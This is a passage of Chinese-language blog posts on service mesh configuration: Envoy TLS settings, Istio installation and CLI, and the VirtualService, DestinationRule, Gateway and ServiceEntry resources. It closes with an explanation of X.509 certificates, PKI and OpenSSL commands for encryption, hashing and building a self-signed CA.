ture,Envoy将拒绝没有有效客户端证书的连接。\rsession_ticket_keys: # tls会话票据相关设置\rUpstreamTIs 定义在cluster中，与集群中的主机通信时使用，它同样支持类似listener的 tls_context 一样的三种定义格式；\nclusters:\r- name:\rtransport_socket:\rname:\rtyped_config:\r\u0026quot;@type\u0026quot;: type.googleapis.com/envoy.extensions.transport_sockets.tls.v3.UpstreamTlsContext\rcommon_tls_context:\rtls_params: {} # tls协议版本和密码套件等\rtls_certificates: [] # tls证书列表\r- certificate_chain: {} # 证书链\rfilename: private_key: {} # tls密钥\rfilename: tls_certificate_sds_secret_configs: [] # 通过静态资源中定义的secret或SDS获取secret\r- name: # secret唯一标识，可以FQDN | UUID | SPKI | sha256 仅指定name时，表示加载static_resources中的secret\rsds_config: {} # xds api 配置源\rvalidation_context_sds_secret_config: {} #通过sds获取验证上下文\r- name:\rsds_config: {}\rallow_renegotiation: boolVal # 如果为true，则将允许服务器启动的TLS重新协商。\rmax_session_keys: {} # 为了恢复会话而存储的最大会话密钥数, 默认值为1，将此值设置为0将禁用会话恢复\r静态TLS配置实例 下面的示例中定义了三个secrets\nserver_cert：服务器端证书，同下游客户端通信时使用，由listener调用 client_cert：客户端证书，与上游端点通信时使用，由cluster调用 valication_context：校验客户端对等证书的配置，由listener调用以校验请求方的证书 ","permalink":"https://www.oomkill.com/2020/09/service-mesh-security/","summary":"","title":"服务网格安全体系"},{"content":"Istio用于提供统一方式来集成微服务的开放平台，管理微服务之间的流量，执行策略和汇总遥测数据。Istio的控制平面在基础集群管理平台（例如Kubernetes）上提供了一个抽象层。\nIstio组成：\n在Istio1.8中，istio由以下组件组成：istio-component\nistio服务网格分为数据平面和控制平面\n数据平面：数据平面是由一组代理组成\nenvoy：Sidecar Proxy 每个微服务代理来处理入口/出口业务服务之间的集群中，并从外部服务的服务。代理形成一个*安全的微服务网格，*提供了丰富的功能集合 控制平面：管理与配置代理的流量规则。\nistiod：istio的控制平面，提供了服务发现，配置和证书管理，包含如下组件： Pilot ：负责运行时配置，（服务发现，智能路由） Citadel：负责证书的颁发与轮替 Galley：负责配置的管理（验证，提取，分发等功能） istio卸载\nbookinfo卸载\nkubectl delete -f samples/bookinfo/platform/kube/bookinfo.yaml\ristio卸载\nistioctl manifest generate|kubectl delete -f -\raddons\nkubectl delete -f samples/addons/prometheus.yaml\rkubectl delete -f samples/addons/jaeger.yaml\rkubectl delete -f samples/addons/kiali.yaml\rkubectl delete -f samples/addons/grafana.yaml\r","permalink":"https://www.oomkill.com/2020/08/istio-install/","summary":"","title":"istio安装"},{"content":"显示配置文件中的差异 istioctl profile diff default demo\n显示对应配置的profile istioctl profile dump demo\n显示可用的配置 istioctl profile list\n安装指定配置的istio istioctl install --set profile=demo\n生成配置清单 istioctl manifest generate\nistioctl验证安装: istioctl manifest generate --set profile=demo |istioctl verify-install -\nistio的非侵入式流量治理\n流量治理是一个非常宽泛的话题，例如：\n◎ 动态修改服务间访问的负载均衡策略，比如根据某个请求特征做会话保持；\n◎ 同一个服务有两个版本在线，将一部分流量切到某个版本上；\n◎ 对服务进行保护，例如限制并发连接数、限制请求数、隔离故障服务实例等；\n◎ 动态修改服务中的内容，或者模拟一个服务运行故障等。\n在Istio中实现这些服务治理功能时无须修改任何应用的代码。较之微服务的SDK方式，Istio以一种更轻便、透明的方式向用户提供了这些功能。用户可以用自己喜欢的任意语言和框架进行开发，专注于自己的业务，完全不用嵌入任何治理逻辑。只要应用运行在Istio的基础设施上，就可以使用这些治理能力。 一句话总结 Istio 流量治理的目标：以基础设施的方式提供给用户非侵入的流量治理能力，用户只需 关注自己的业务逻辑开发，无须关注服务访问管理。\nistio服务架构 在istio1.8中，istio的分为 envoy （数据平面） 、istiod （控制平面） 、addons（管理插件） 及 istioctl （命令行工具，用于安装、配置、诊断分析等操作）组成。\nPilot Pilot是Istio控制平面流量管理的核心组件，管理和配置部署在Istio服务网格中的所有Envoy代理实例。\npilot-discovery为envoy sidecar提供服务发现，用于路由及流量的管理。通过kubernetes CRD资源获取网格的配置信息将其转换为xDS接口的标准数据格式后，通过gRPC分发至相关的envoy sidecar\nPilot组件包含工作在控制平面中的 pilot-discovery 和工作与数据平面的pilot-agent 与Envoy(istio-proxy)\npilot-discovery主要完成如下功能：\n从service registry中获取服务信息 从apiserver中获取配置信息。 将服务信息与配置信息适配为xDS接口的标准数据格式，通过xDS api完成配置分发。 pilot-agent 主要完成如下功能\n基于kubernetes apiserver为envoy初始化可用的boostrap配置文件并启动envoy。\n管理监控envoy的云兄状态及配置重载。\nenvoy\n每个sidecar中的envoy是由pilot-agent基于生产的bootstrap配置进行启动，并根据指定的pilot地址，通过xDS api动态获取配置。 sidecar形式的envoy通过流量拦截机制为应用程序实现入站和出站的代理功能。 在istio中的管理策略都是基于Kubernetes CRD的实现，其中有关于流量管理的CRD资源包括 VirtualService EnvoyFilter Gateway ServiceEntry Sidecar DestinationRule WorkloadEntry WorkloadGroup。reference istio-networking-crd-resouces\nVirtualServices：用于定义路由，可以理解为envoy的 listener =\u0026gt; filter =\u0026gt; route_config\nDestinationRule：用于定义集群，可以理解为envoy 的 cluster\nGateway：用于定义作用于istio-ingress-gateway\nServiceEntry：用于定义出站的路由，作用于istio-egress-gateway\nEnvoyFilter：为envoy添加过滤器或过滤器链。\nSidecar：用于定义运行在sidecar之上的envoy配置。\nVirtual Services和 Destination Rules是Istio流量路由功能的核心组件\nIstio基于ServiceEntry资源对象将外部服务注册到网格内，从而像将外部服务以类 同内部服务一样的方式进行访问治理；  对于外部服务，网格内Sidecar方式运行的Envoy即能执行治理；  若需要将外出流量收束于特定几个节点时则需要使用专用的Egress Gateway完成，并基 于此Egress Gateway执行相应的流量治理；\n网格流量管理 配置istio Virtual Services VirtualServices是istio用于在其运行平台Kubernetes定义的配置，用来影响流量的路由规则；其本质就是为集群中envoy提供路由配置的。\nVirtualServices名词解释 VirtualServices中一些流量路由定义的关键术语。\nServices：服务的唯一应用名称的单位，在Kubernetes之上 Services通常为Kubernetes Services资源。\nSource：在上文中，下游发起请求的客户端服务。\nHost：客户端请求服务时使用的地址\nService versions：service允许的不同版本的子集（通常为流量管理中的概念，如AB等）每个Service都有一个包含所有实例的默认版本。\nVirtualServices资源说明 VirtualServices中主要有这些配置用于配置流量的路由定义。 reference virtual services\nhosts：string[] 目标主机，可以是带有统配符的DNS Name或IP\ngateways：string[]，这些资源生效的网关和sidecar的名称。默认为名称空间级别，跨名称空间使用 \u0026lt;gateway namespace\u0026gt;/\u0026lt;gateway name\u0026gt;\nmesh 默认值，表示生效与网格内所有sidecar\n仅应用于Gateway，该字段设置为Gateway的名称。\n忽略此字段：将应用于网格内部所有的sidecar\nhttp： HTTP协议流量的路由规则表。\nmatch：[] 匹配的条件。一个列表内单项内容的条件具有AND，整个列表的条件为OR。 name： uri：匹配值区分大小写 exact: 精确匹配。 prefix：用于前缀匹配。 regex：基于正则表达式匹配。 method：HTTP方法，参数与uri相同。 \u0026hellip; route：[] 设置的http流量的转发规则 destination：请求转发到的唯一标识符。 host：允许平台及ServiceEntry的服务名称，Kubernetes中为短名称reviews.default.svc.cluster.local subset，在DestinationRule中定义的子集 port：可选，公开服务的端口 weight：转发流量的比例0-100 ，各目标的和应为100。 headers：操作头规则。 redirect：重定向规则 delegate：只能在Route和Redirect为空时设置，委托的VirtualServices 名称 rewrite：重写HTTP URI。 timeout：HTTP请求超时，默认禁用。 retries：HTTP请求重试策略。 fault：故障注入 mirror：流量镜像 mirrorPercentage：对应mirror的比例 headers：操作http头的规则 \u0026hellip; tcp：TCP流量的路由规则的有序列表\nexportTo：允许 VirtualServices 其他名称空间的sidecar与gateway使用。\nVirtualServices配置实例 基于HTTP header的请求，将请求为/ratings/v2/ 路径，并且请求头包含 end-user 值为jason 。\napiVersion: networking.istio.io/v1alpha3\rkind: VirtualService\rmetadata:\rname: ratings-route\rspec:\rhosts:\r- ratings.prod.svc.cluster.local\rhttp:\r- match:\r- headers:\rend-user:\rexact: jason\ruri:\rprefix: \u0026quot;/ratings/v2/\u0026quot;\rignoreUriCase: true # 是否区分大小写，仅exact和prefix生效。\rroute:\r- destination:\rhost: ratings.prod.svc.cluster.local\r委托其他virtualServices处理\napiVersion: networking.istio.io/v1alpha3\rkind: VirtualService\rmetadata:\rname: bookinfo\rspec:\rhosts:\r- \u0026quot;bookinfo.com\u0026quot;\rgateways:\r- mygateway\rhttp:\r- match:\r- uri:\rprefix: \u0026quot;/productpage\u0026quot;\rdelegate:\rname: productpage\rnamespace: nsA\r- match:\r- uri:\rprefix: \u0026quot;/reviews\u0026quot;\rdelegate:\rname: reviews\rnamespace: nsB\rapiVersion: networking.istio.io/v1alpha3\rkind: VirtualService\rmetadata:\rname: productpage\rnamespace: nsA\rspec:\rhttp:\r- match:\r- uri:\rprefix: \u0026quot;/productpage/v1/\u0026quot;\rroute:\r- destination:\rhost: productpage-v1.nsA.svc.cluster.local\r- route:\r- destination:\rhost: productpage.nsA.svc.cluster.local\r---\rapiVersion: networking.istio.io/v1alpha3\rkind: VirtualService\rmetadata:\rname: reviews\rnamespace: nsB\rspec:\rhttp:\r- route:\r- destination:\rhost: reviews.nsB.svc.cluster.local\rIstio目标规则配置：DestinationRule DestinationRule定义在完成路由配置后应用于服务流量的策略，即如何将流量调度至集群内，可以理解为DestinationRule定义的是envoy中的cluster。应用的内容也是envoy中cluster段的配置，如负载均衡配置，sidecar连接值及离群检测。\nDestinationRule字段说明 host: 注册表中的服务名称，kubernetes平台中使用短名称 trafficPolicy：应用的流量策略。 loadBalancer：使用的负载均衡算法， simple ROUND_ROBIN LEAST_CONN RANDOM PASSTHROUGH connectionPool：一致性hash outlierDetection：离群值检测 consecutiveGatewayErrors：满足502 503 504 错误数弹出。 consecutive5xxErrors： 满足5xx错误数弹出。 interval：探测时间间隔 baseEjectionTime：最小逐出时间。主机被驱逐的时间等于baseEjectionTime * 退出次数。 maxEjectionPercent：最大驱逐比例，默认10%。 minHealthPercent：最少健康比例，默认为0% tls portLevelSettings subsets：[] 服务各个版本命名集。 name：子集的名称 labels：标签过滤器 trafficPolicy：子集流量策略，继承DestinationRule级别流量策略。 exportTo：跨名称空间使用。 DestinationRule配置实例 基于服务子集的配置\napiVersion: networking.istio.io/v1alpha3\rkind: DestinationRule\rmetadata:\rname: bookinfo-ratings\rspec:\rhost: ratings.prod.svc.cluster.local\rtrafficPolicy:\rloadBalancer:\rsimple: LEAST_CONN\rsubsets:\r- name: testversionv3\rlabels:\rversion: v3\r- name: testversionv2\rlabels:\rversion: v2\rtrafficPolicy:\rloadBalancer:\rsimple: ROUND_ROBIN\r配置离群值\napiVersion: networking.istio.io/v1alpha3\rkind: DestinationRule\rmetadata:\rname: reviews-cb-policy\rspec:\rhost: reviews.prod.svc.cluster.local\rtrafficPolicy:\rconnectionPool:\rtcp:\rmaxConnections: 100\rhttp:\rhttp2MaxRequests: 1000\rmaxRequestsPerConnection: 10\routlierDetection:\rconsecutiveErrors: 7\rinterval: 5m\rbaseEjectionTime: 15m\r使用istio gateway配置服务入口 Istio还提供了一种配置模型 Istio Gateway。Gateway 与 KubernetesIngress 相比，Gateway有高度的定制化与灵活性，并且允许将Istio功能应用于集群流量入口。\nGateway中运行的程序为envoy，它从控制平面接收相应的配置，并完成相关流量的传输；Gateway资源只负责网络入口点的相关功能，具体的路由实现则由VirtualService完成。\nGateway CRD资源说明 Gateway定义了一个集群入口的负载均衡器，该负载均衡为运行在网格的边缘代理，负责将外部流量引入集群的内部。\nGateway资源生效于Ingress | Egress Envoy Pod的标签选择器，使用selector定义：selector: app=istio-ingressgateway。\napiVersion: networking.istio.io/v1alpha3\rkind: Gateway\rmetadata:\rname: study-gateway\rnamespace: default\rspec:\rselector: # 基于名称空间中匹配pod的标签从而生效的应用\rapp: istio-ingressgateway # 标签可以是一个或多个\rservers: # 描述对应的envoy的lintener的配置。\r- port: # 设置envoy lintener\rnumber: 90 # 端口号 (Required)\rtargetPort: # 可选 (Optional)\rname: envoy_end # 分配给端口的标签。\rprotocol: HTTP # 端口服务协议，HTTP|HTTPS|GRPC|HTTP2|MONGO|TCP|TLS\rhosts: [ \u0026quot;*\u0026quot; , \u0026quot;text.studyenvoy.com\u0026quot; ] # 设置dnsName 可选的名称空间，*|. tls: # 与TLS相关的选项集 (Optional)\rname: # 服务器的可选名称，必须唯一 (Optional)\rGateway配置实例 基于istio Bookinfo示例的Gateway资源清单。\napiVersion: networking.istio.io/v1alpha3\rkind: Gateway\rmetadata:\rname: bookinfo-gateway\rspec:\rselector:\ristio: ingressgateway # use istio default controller\rservers:\r- port:\rnumber: 80\rname: http\rprotocol: HTTP\rhosts:\r- \u0026quot;*\u0026quot;\r这里可以看到istio-ingress-gateway的pod的标签 app=istio-ingressgateway\n$ kubectl get pods -n istio-system --show-labels\rNAME READY STATUS RESTARTS AGE LABELS\ristio-ingressgateway-78b47bc88b-xqqpn 1/1 Running 0 22d app=istio-ingressgateway, chart=gateways, heritage=Tiller, install.operator.istio.io/owning-resource=unknown,\ristio.io/rev=default,istio=ingressgateway,\roperator.istio.io/component=IngressGateways,\rpod-template-hash=78b47bc88b,\rrelease=istio,service.istio.io/canonical-name=istio-ingressgateway,\rservice.istio.io/canonical-revision=latest\rIstio外部服务配置：ServiceEntry 在Istio中提供了ServiceEntry，可将网格外的服务加入网格中，像网格内的服务一样进行管理。\n在实现上就是把外部服务加入 Istio 的服务发现，这些外部服务因为各种原因不能被直接注册到网格中。\nServiceEntry字段说明 host：与ServiceEntry关联的主机 addresses：与服务关联的虚拟IP地址。 ports： number：服务的端口。 protocol：服务公开的协议。HTTP|HTTPS|GRPC|HTTP2|MONGO|TCP| TLS之一。 targetPort：目标端口号。 location：MESH_EXTERNAL | MESH_INTERNAL，决定是网格内部还是外部。 resolution：服务发现机制。 NONE： STATIC：指定静态IP地址。 DNS：通过DNS发现。 endpoints：服务关联的端点，workloadSelector 与 endpoints 二选一。 exportTo：共享其他名称空间 subjectAltNames：如指定，将验证服务器证书的使用者备用名称是否与指定值之一匹配。 使用istio ingress gateway 配置一个网格外部的应用 部署应用程序 准备一个后端的应用\napiVersion: apps/v1\rkind: Deployment\rmetadata:\rname: httpend-deply\rnamespace: kube-system\rlabels:\rapp: httpend-deply\rspec:\rreplicas: 1\rselector:\rmatchLabels:\rapp: httpend-deply\rtemplate:\rmetadata:\rnamespace: kube-system\rname: httpend-deply\rlabels:\rapp: httpend-deply\rspec:\rcontainers:\r- name: envoy-end\rimage: sealloong/envoy-end\rimagePullPolicy: IfNotPresent\rlivenessProbe:\rinitialDelaySeconds: 3 # 首次探测延迟时间\rperiodSeconds: 2 # 定期重试\rfailureThreshold: 1 # 失败重试次数\rhttpGet:\rport: 90\rpath: ping\rrestartPolicy: Always\r---\rapiVersion: v1\rkind: Service\rmetadata:\rname: envoy-end\rlabels:\rapp: envoy-end\rnamespace: kube-system\rspec:\rtype: NodePort # nodeport是为了验证服务是否正常\rports:\r- port: 90\rname: envoy-end\rtargetPort: 90\rnodePort: 30102\rselector:\rapp: httpend-deply\r应用Gateway和VirtualServices\napiVersion: networking.istio.io/v1alpha3\rkind: Gateway\rmetadata:\rname: envoyend-gateway\rnamespace: kube-system\rspec:\rselector:\ristio: ingressgateway\rservers:\r- port:\rnumber: 90\rname: http\rprotocol: HTTP\rhosts:\r- \u0026quot;*\u0026quot;\r---\rapiVersion: networking.istio.io/v1alpha3\rkind: VirtualService\rmetadata:\rname: envoy-end\rnamespace: kube-system\rspec:\rhosts:\r- \u0026quot;*\u0026quot;\rgateways:\r- envoyend-gateway\rhttp:\r- match:\r- uri:\rexact: /\rroute:\r- destination:\rhost: envoy-end\rport:\rnumber: 90\r应用DestinationRule\napiVersion: networking.istio.io/v1alpha3\rkind: DestinationRule\rmetadata:\rname: envoyend\rnamespace: kube-system\rspec:\rhost: envoy-end\rsubsets:\r- name: end\rlabels:\rapp: httpend-deply\r","permalink":"https://www.oomkill.com/2020/08/istio-cli/","summary":"","title":"istio命令"},{"content":"数字证书 互联网上任意双方之间实现通信时，证书的目的有两种，\n主机证书，主要实现主机与主机之间进程间通信的。 个人证书，主要用作个人通信的，主要用作加密的数据的发送。 主机类证书所拥有的标识主要为主机名，主机证书名称一定要与互联网之上访问名称一致，否则此证书为不可信证书。\n对于一个安全的通信，应该有以下特征：\n完整性：消息在传输过程中未被篡改 身份验证：确认消息发送者的身份 不可否认：消息的发送者无法否认自己发送了信息 显然，数字签名和消息认证码是不符合要求的，这里就需要数字证书来解决其弊端。\n数字证书（digital certificate）又称公开密钥认证 PKC（英语：Public key certificate）。是在互联网通信中，方式数字签名的秘钥被篡改，是用来证明公开密钥拥有者的身份。此文件包含了公钥信息、拥有者身份信息（主体）、以及数字证书认证机构（发行者）对这份文件的数字签名，以保证这个文件的整体内容正确无误。\n数字证书认证机构 CA (Certificate Authority)：是负责发放和管理数字证书的权威机构。\n公钥证书的格式标准 X.509是密码学中公钥明证PKC的格式标准，所有的证书都符合ITU-T X.509国际标准。X.509证书的结构是用ASN1 (Abstract Syntax Notation One)进行描述数据结构，并使用ASN.1语法进行编码。\n证书规范 X.509指的是ITU和ISO联合制定的（RFC5280）里定义的的 X.509 v3\n前使用最广泛的标准为X.509的 v3版本规范 (RFC5280）, 一般遵从X.509格式规范的证书，会有以下的内容：\n证书组成结构\n结构 说明 版本 现行通用版本是 V3， 序号 用来识别每一张证书，用来追踪和撤销证书。只要拥有签发者信息和序列号，就可以唯一标识一个证书，最大不能过20个字节；由CA来维护 主体 拥有此证书的法人或自然人身份或机器，包括：\n国家（C，Country） 州/省（S，State）** 地域/城市（L，Location） 组织/单位（O，Organization） 通用名称（CN，Common Name）：在TLS应用上，此字段一般是域名 发行者 以数字签名形式签署此证书的数字证书认证机构 有效期(Validity) 此证书的有效开始时间，在此前该证书并未生效；此证书的有效结束时间，在此后该证书作废。 公开密钥用途 指定证书上公钥的用途，例如数字签名、服务器验证、客户端验证等 公开密钥 公开密钥指纹 数字签名 使用信任的CA对内容进行 主体别名 例如一个网站可能会有多个域名（www.jd.com www.360buy.com..）\n一个组织可能会有多个网站（*.baidu.com tieba.baidu.com），不同的网域可以一并使用同一张证书，方便实现应用及管理。 互联网上任意双方之间实现通信时，证书的目的有两种，\n主机证书，主要实现主机与主机之间进程间通信的。 个人证书，主要用作个人通信的，主要用作加密的数据的发送。 主机类证书所拥有的标识主要为主机名，主机证书名称一定要与互联网之上访问名称一致，否则此证书为不可信证书。\n数字证书文件格式 X.509一般推荐使用PEM (Privacy Enhanced Mail）格式来存储证书相关的文件。\n.crt \u0026amp; .cer：证书文件后缀名 .key: 私钥后缀名 .csr：证书请求文件后缀名\n公钥基础设施（PKI） 公钥基础设施 PKI（Public-Key infrastructure）是为了能够更有效地运用公钥而制定的一系列规范和规格的总称。\nPKI的组成要素 用户：使用PKI的人 注册公钥用户。 使用已注册公钥用户。 认证机构： 签证机构：CA Certificate Authority 注册机构：RA 仓库 证书吊销列表：CRL； 证书存取库，从签发机构中获得其签发的证书，需要有存取库来提供这些证书。 SSL/TLS 传输层安全协议，TLS，（Transport Layer Security），其前身为安全套接层 SSL（Secure Sockets Layer）。SSL3.0为SSL最高版本，3.1 即TLS 1.0\nSSL/TLS是世界上应用最广泛的密码通信方法。比如说，当在网上商城中输人信用卡号时，我们的Web浏览器就会使用SSL/TLS进行密码通信。使用SSL/TLS可以对通信对象进行认证，还可以确保通信内容的机密性。\n协议 时间 状态 SSL 1.0 未公布 未公布 SSL 2.0 1995年 已于2011年弃用 SSL 3.0 1996年 已于2015年弃用 TLS 1.0 1999年 TLS 1.1 2006年 TLS 1.2 2008年 TLS 1.3 2018年 http协议本身为文本格式，数据发送做文本编码；https协议实现的是二进制格式，数据发送做文本编码。由于ssl的存在，双方在实现通讯时，除了tcp协议三次 握手之外，双方还需做ssl握手会话的过程（认证密钥证书、数据交换等）。ssl会话的建立只能基于IP地址，无法基于主机名识别每一个通信方。一个IP地址在某个应用协议上只能建立一个ssl会话。\nTLS采用了分层设计，虽然在TCP/IP协议栈上，SSL增加的半层，其内部实现为多层\n最底层，基础算法原语的实现，aes，rsa，md5 向上一层，选定参数后，符合密码学标准分类的算法的实现 aes-128-abc-pkcs7 abc内部块的串联方式 pkcs7 对称加密公钥格式。 再向上一层：组合算法实现的半成品。 用各种组件拼装而成的种种成品密码学协议/软件 tls ssh。 openssh是利用openssl工具实现的软件程序。 OpenSSL OpenSSL是一个开放源代码的软件库，并实现了SSL与TLS协议。OpenSSL可以运行在，MS Windows、Linux、MacOS。OpenSSL已经成为linux基础公共组件，主要由三个开源组件组成：\nopenssl：多用途的命令行工具，能实现对称加密、非对称加密、单项加密等。各功能分别使用单独子命令来实现。 libcrypto：公共加密库，实现了多种加密算法。 libssl：实现了SSL及TLS的功能库 OpenSSL命令 OpenSSL命令分为 标准命令Standard commands、消息摘要命令Message Digest commands、密码命令Cipher commands三部分组成。\n标准命令。完成某些功能时使用的，如生成随机数、扮演CA签发证书。 enc 对称加密 crl 证书吊销列表 ca 证书签发机构 dgst 消息摘要算法（单项散列函数） dh 密钥交换算法 req 请求证书生成器 消息摘要命令算法，常用散列函数。 加密命令，所支持的加密算法。 OpenSSL 命令使用 对称加密 加密\nopenssl enc -e -des3 -a -salt -in /etc/passwd -out ./passwd 解密\nopenssl enc -d -des3 -a -salt -in passwd -d 解密 -e 加密 -a base64编码处理数据 单项加密 openssl中，单项加密即数字签名计算message的摘要信息，为 openssl dgst...\n单项散列函数通常应用于数字签名于消息认证码（MAC： Message Authentication Code 消息认证码，单项加密的一种延申应用，用于实现再网络通信中保证所传输的数据的完整性。）\n$ openssl dgst -md5 /var/log/messages MD5(/var/log/messages)= 4515fae68552c00646ee7e07aac25d1d 也可以简写为\n$ openssl md5 /var/log/messages MD5(/var/log/messages)= 24483320e6af7ed2cee401aa00c260e6 openssl也可以生成用户密码 sslpasswd\n$ openssl passwd -1 -salt 123456 Password: $1$123456$wWKtx7yY/RnLiPN.KaX.z. $1$123456$wWKtx7yY/RnLiPN.KaX.z. 这是扩展Unix风格的crypt(3) 密码哈希语法。格式为 $id$salt$encrypted 前$id$符表示加密算法 1标识md5 6标识SHA-512，123456是指定的salt,salt为id后的最多16位的对密码加盐。\nReference crypt unix style encrypted\n使用openssl生成随机数 hex基于16进制编码格式 每个字节4位，4指的是4个字节，一个字节是8位二进制数。4位二进制可以用一个16进制字节标识（一个十六进制对应四个二进制 $44=16$） 出现字符 num2\n$ openssl rand -hex 16 8cd7c7a85e22b4548f6942468028fde4 $ openssl rand -base64 6 c0jDwKIG 使用OpenSSL生成自签数字证书 获取证书两种方法：\n使用证书授权机构 生成签名请求（csr） 将csr发送给CA 从CA处接收签名 自签名的证书：自已签发自己的公钥 1. 建立RootCA 生成私钥\n参数 说明 -new 表示生成一个新证书签署请求 -x509 专用于CA生成自签证书，如果不是自签证书则不需要此项 -key 生成请求时用到的私钥文件 -out 证书的保存路径 -days 证书的有效期限，单位是day（天），默认是365天 cd /etc/pki/tls/ openssl genrsa -out private/cakey.pem 2048 # 路径和名称必须为openssl配置文件中路径的名称 2 自签名证书 openssl req -new \\ -x509 \\ -key private/cakey.pem \\ -out cacert.pem \\ -days 3650 \\ -subj \u0026quot;/C=HK/ST=HK/L=HK/O=chinamobile/OU=SY/CN=CHINA MOBILE\u0026quot; 自签名证书是base64编码的，查看证书内容\nopenssl x509 -in cacert.pem -noout -text 参数 说明 x509 格式 -noout 输出时不生成新文件，只显示内容 -text 以文本格式输出 数字证书中主题(Subject)中字段的含义\n一般的数字证书产品的主题通常含有如下字段： 字段名 说明 公用名称 CN (Common Name) 对于 SSL 证书，一般为网站域名；而对于代码签名证书则为申请单位名称；而对于客户端证书则为证书申请者的姓名； 单位名称 O (Organization Name) 对于 SSL 证书，一般为网站域名；而对于代码签名证书则为申请单位名称；而对于客户端单位证书则为证书申请者所在单位名称； OU 可以理解为公司部门名称 所在城市 L (Locality) 所在省份 ST(State/Provice) 所在国家 C (Country） 可以看到生成了一个Chinamobile的自签的RootCA\n用户或组织向CA申请公钥（证书） 生成私钥 mkdir child openssl genrsa -out child/child.pem 2048 生成证书申请文件 child.csr openssl req -new \\ -key child/child.pem \\ -out child/child.csr \\ -subj \u0026quot;/C=HK/ST=HK/L=HK/O=chinamobile/OU=SY/CN=*.10086.com\u0026quot; 将证书申请文件发送给CA 可以通过任意方式发送申请文件给CA\nCA颁发证书 touch /etc/pki/CA/index.txt touch /etc/pki/CA/serial # 下一个要颁发的编号 16进制 touch /etc/pki/CA/crlnumber echo 01 \u0026gt; /etc/pki/CA/serial openssl ca -in child/child.csr \\ # 签发请求 -cert cacert.pem \\ # CA证书 -keyfile private/cakey.pem \\ # CA私钥 -out child/a.crt -days 30 证书发送给客户端 在应用软件中使用证书\nOpenSSL配置文件注释 /etc/pki/tls/openssl.cnf 定义了管理CA的相关信息。\n# 语法 # 变量 = 值 # 1. 字符串值最好使用双引号界定，并且其中可以使用\u0026quot;\\n\u0026quot;,\u0026quot;\\r\u0026quot;,\u0026quot;\\t\u0026quot;,\u0026quot;\\\\\u0026quot;这些转义序列。 # 2. 可以使用 ${变量名} 的形式引用同一字段中的变量，使用 ${字段名::变量名} 的形式引用其它字段中的变量。 # 3. 可以使用 ${ENV::环境变量} 的形式引用操作系统中定义的环境变量，若变量不存在则会导致错误。 # 4. 可以在默认字段定义与操作系统环境变量同名的变量作为默认值来避免环境变量不存在导致的错误。 # 5. 如果在同一字段内有多个相同名称的变量，那么后面的值将覆盖前面的值。 # 6. 可以通过 \u0026quot;.include = 绝对路径\u0026quot; 语法或 OPENSSL_CONF_INCLUDE 环境变量引入其他配置文件(*.cnf)。 # 定义 HOME 的默认值，防止操作系统中不存在 HOME 环境变量。 HOME\t= . # 默认的随机数种子文件，对应 -rand 命令行选项。 RANDFILE\t= $ENV::HOME/.rnd # 扩展对象定义 # 如果没有在 OpenSSL 命令行中定义X.509证书的扩展项，那么就会从下面对扩展对象的定义中获取。 # 定义方法有两种，第一种(反对使用)是存储在外部文件中，也就是这里\u0026quot;oid_file\u0026quot;变量定义的文件。 #oid_file\t= $ENV::HOME/.oid # 第二种是存储在配置文件的一个字段中，也就是这里\u0026quot;oid_section\u0026quot;变量值所指定的字段。 oid_section\t= new_oids # 要将此配置文件用于 \u0026quot;openssl x509\u0026quot; 命令的 \u0026quot;-extfile\u0026quot; 选项， # 请在此指定包含 X.509v3 扩展的小节名称 #extensions = # 或者使用一个默认字段中仅包含 X.509v3 扩展的配置文件 [ new_oids ] # 添加可以被 'ca', 'req', 'ts' 命令使用的扩展对象。格式如下： # 对象简称 = 对象数字ID # 下面是一些增强型密钥用法(extendedKeyUsage)的例子 # We can add new OIDs in here for use by 'ca', 'req' and 'ts'. # Add a simple OID like this: # testoid1=1.2.3.4 # Or use config file substitution like this: # testoid2=${testoid1}.5.6 # Policies used by the TSA examples. tsa_policy1 = 1.2.3.4.1 tsa_policy2 = 1.2.3.4.5.6 tsa_policy3 = 1.2.3.4.5.7 ######################################################################################## ################################### 证书签发配置 ###################################### ######################################################################################## # openssl 的 ca 命令实现了证书签发的功能，其相关选项的默认值就来自于这里的设置。 # 这个字段只是通过唯一的 default_ca 变量来指定默认CA主配置字段的入口(-name 命令行选项的默认值) ######################################################################################## ######################## 默认CA主配置字段，(★)标记表示必需项 ############################# ######################################################################################## [ ca ] # default_ca\t= CA_default\t# The default ca section # 默认CA ######################################################################################## ######################### 默认CA主配置字段，(★)标记表示必需项 ############################ ######################################################################################## [ CA_default ] # 保存所有信息的文件夹，这个变量只是为了给后面的变量使用 dir\t= /etc/pki/CA # (★)存放新签发证书的默认目录，证书名就是该证书的系列号，后缀是.pem 。对应 -outdir 命令行选项。 certs\t= $dir/certs # 存放证书吊销列表的 crl_dir\t= $dir/crl # 数据库，颁发了那些证书，以及证书状态、编号。 数据索引。默认不存在的 database\t= $dir/index.txt #unique_subject\t= no #(★)存放新签发证书的默认目录，证书名就是该证书的系列号，后缀是.pem 。对应 -outdir 命令行选项。 new_certs_dir\t= $dir/newcerts\t# default place for new certs. # 新证书目录 #(★)存放CA自身证书的文件名。对应 -cert 命令行选项。 certificate\t= $dir/cacert.pem #(★)签发证书时使用的序列号文本文件，里面必须包含下一个可用的16进制数字。。需手工创建 serial\t= $dir/serial # 存放当前(下一个吊销证书编号)CRL编号的文件，需手工创建 crlnumber\t= $dir/crlnumber # 证书吊销列表 crl\t= $dir/crl.pem #(★)存放CA自身私钥的文件名。对应 -keyfile 命令行选项。 private_key\t= $dir/private/cakey.pem # 私钥文件路径 RANDFILE\t= $dir/private/.rand # 定义X.509证书扩展项的字段。对应 -extensions 命令行选项。 x509_extensions\t= usr_cert # 当用户需要确认签发证书时可读证书DN域的显示格式。可用值与 x509 指令的 -nameopt 选项相同。 name_opt = ca_default\t# Subject Name options # 可用值与 x509 指令的 -certopt 选项相同，不过 no_signame 和 no_sigdump 总被默认设置。 cert_opt = ca_default\t# Certificate field options # 是否将证书请求中的扩展项信息加入到证书扩展项中去。取值范围以及解释： ## none: 忽略所有证书请求中的扩展项 ## copy: 将证书扩展项中没有的项目复制到证书中 ## copyall: 将所有证书请求中的扩展项都复制过去，并且覆盖证书扩展项中原来已经存在的值。 ## 此选项的主要用途是允许证书请求提供例如 subjectAltName 之类扩展的值。 # copy_extensions = copy # 定义生成CRL时需要加入的扩展项字段。对应 -crlexts 命令行选项。 # crl_extensions\t= crl_ext # 新签发的证书默认有效期，以天为单位。依次对应 -days , -startdate , -enddate 命令行选项。 default_days\t= 365\t# 颁发证书默认有效期 # crl的有效期 30天 default_crl_days= 30 # 默认hash算法 default_md\t= sha256 preserve\t= no\t# keep passed DN ordering 